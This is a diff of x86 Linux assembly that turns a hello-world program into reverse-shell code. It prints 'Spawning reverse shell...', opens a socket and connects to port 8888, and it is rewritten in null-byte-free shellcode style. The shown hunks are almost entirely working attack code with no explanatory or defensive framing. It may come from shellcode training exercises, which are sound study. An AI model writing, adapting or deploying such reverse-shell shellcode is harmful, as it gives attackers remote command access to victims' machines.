@@ -11,13 +11,24 @@ global _start
 section .text
 _start:
 
-	; Print hello world using write syscall
 
-	mov eax, 0x4
-	mov ebx, 1
-	mov ecx, message
-	mov edx, mlen
+	; Print message
+	xor eax, eax
+	mov al, 0x4
+	xor ebx, ebx
+	mov bl, 1
+	push 0x0a20202e
+	push 0x2e2e6c6c
+	push 0x65687320
+	push 0x65737265
+	push 0x76657220
+	push 0x676e696e
+	push 0x77617053
+	mov ecx, esp
+	xor edx, edx
+	mov dl, 28
 	int 0x80
+
 
 	; Socket - 359
 	; int socket (
@@ -57,18 +68,19 @@ _start:
 	mov cl, 2
 	int 0x80
 
+
 	;Connect - 362
 	xor eax, eax
 	mov ax, 0x16a
 	mov ebx, [socket]
 	xor edi, edi
 	push dword edi 		; push 0 => ip 0.0.0.0
-    push edi		; port 8888, big endian
+    push edi			; port 8888, big endian
     push word 0xb822 	; port 8888, big endian
     push word 2 
 	mov ecx, esp
 	xor edx, edx
-	mov dl, 0x66 ; 102
+	mov dl, 0x66 		; 102
 	int 0x80
 
 
@@ -86,13 +98,6 @@ _start:
 	int 0x80
 
 
-section .data
-
-	message: db "Hello World!"
-	mlen     equ $-message
-
-
 section .bss
 	socket resd 1
-	socket_address resd 2
-	accept_res	resd 1
+
